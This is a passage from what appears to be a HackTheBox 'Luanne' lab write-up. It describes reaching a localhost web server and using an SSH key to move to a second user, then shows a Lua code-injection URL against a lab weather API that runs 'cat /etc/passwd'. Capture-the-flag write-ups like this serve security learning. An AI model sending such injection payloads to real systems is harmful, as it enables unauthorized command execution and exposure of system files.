That granted me access to a localhost web server, where an SSH key awaited, propelling me to the second user level. message.</p><p><code>http://10.10.10.218/weather/forecast?city=list;')os.execute("cat /etc/passwd")--</code></p><figure><img src="/writing/media/bda508cce256059e3026fd1e.webp" alt="HackTheBox “Luanne”
